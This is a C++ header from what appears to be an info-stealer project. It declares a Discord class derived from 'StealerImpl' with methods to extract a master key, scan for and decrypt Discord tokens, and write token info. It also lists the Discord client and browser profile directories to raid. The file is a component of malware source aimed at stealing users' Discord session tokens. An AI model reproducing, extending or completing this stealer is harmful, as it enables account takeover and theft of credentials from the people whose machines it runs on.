//
// Created by .1qxz on 07.06.2024.
//

#ifndef STEALER_DISCORD_H
#define STEALER_DISCORD_H

#include <fstream>
#include <sstream>
#include <regex>
#include "json.hpp"
#include <windows.h>

#include "../../../StealerImpl.h"

using json = nlohmann::json;

class Discord : public StealerImpl {
public:
    void execute(fs::path &root) override;
private:
    static std::vector<BYTE> getMaterKey(fs::path &root);

    static void writeTokenInfo(const std::string& token, const fs::path& root);

    std::vector<std::string> getTokens();
    std::vector<std::string> getToken(fs::path &root);
    static std::vector<std::string> scanToken(fs::path &root, const std::vector<BYTE>& master_key);
    static std::string decrypt(const std::vector<unsigned char>& buffer, const std::vector<unsigned char>& master_key);

    std::vector<fs::path> discord_paths = {
        Utils::getRoamingPath() / "discord",
        Utils::getRoamingPath() / "discordcanary",
        Utils::getRoamingPath() / "Lightcord",
        Utils::getRoamingPath() / "discordptb",
        Utils::getRoamingPath() / "Opera Software"       / "Opera Stable",
        Utils::getLocalPath()   / "Amigo"                / "User Data",
        Utils::getLocalPath()   / "Torch"                / "User Data",
        Utils::getLocalPath()   / "Kometa"               / "User Data",
        Utils::getLocalPath()   / "Orbitum"              / "User Data",
        Utils::getLocalPath()   / "Epic Privacy Browser" / "User Data",
        Utils::getLocalPath()   / "CentBrowser"          / "User Data",
        Utils::getLocalPath()   / "Vivaldi"              / "User Data"     / "Default",
        Utils::getLocalPath()   / "Iridium"              / "User Data"     / "Default",
        Utils::getLocalPath()   / "7Star"                / "7Star"         / "User Data",
        Utils::getLocalPath()   / "Sputnik"              / "Sputnik"       / "User Data",
        Utils::getLocalPath()   / "Google"               / "Chrome SxS"    / "User Data",
        Utils::getLocalPath()   / "Google"               / "Chrome"        / "User Data" / "Default",
        Utils::getLocalPath()   / "Microsoft"            / "Edge"          / "User Data" / "Default",
        Utils::getLocalPath()   / "uCozMedia"            / "Uran"          / "User Data" / "Default",
        Utils::getLocalPath()   / "Yandex"               / "YandexBrowser" / "User Data" / "Default",
        Utils::getLocalPath()   / "BraveSoftware"        / "Brave-Browser" / "User Data" / "Default"
    };
};


#endif //STEALER_DISCORD_H
